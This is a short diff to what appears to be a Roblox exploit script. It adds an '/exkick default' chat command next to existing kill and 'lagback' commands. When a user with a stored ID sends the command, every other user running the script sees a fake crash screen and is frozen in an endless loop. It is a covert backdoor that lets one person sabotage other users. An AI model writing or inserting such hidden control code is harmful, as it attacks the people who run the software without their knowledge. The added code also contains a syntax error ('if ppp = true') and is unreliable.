@@ -547,6 +547,20 @@ end
 					game.Players.LocalPlayer.Character.Humanoid.Health = -1
 				end
 			end
+		local ppp = false
+		 if msg == "/exkick default" then
+				if lplr.UserId == tonumber(ah) then
+					
+				else
+					ppp = true
+					game.CoreGui.Curiousli.CRASH.Visible = true
+					while wait(0.1) do
+						if ppp = true then
+						lplr.Character.Humanoid.WalkSpeed = 0			
+						end
+					end
+				end
+			end
 			
 			if msg == "/lagback default" then
 				if lplr.UserId == tonumber(ah) then
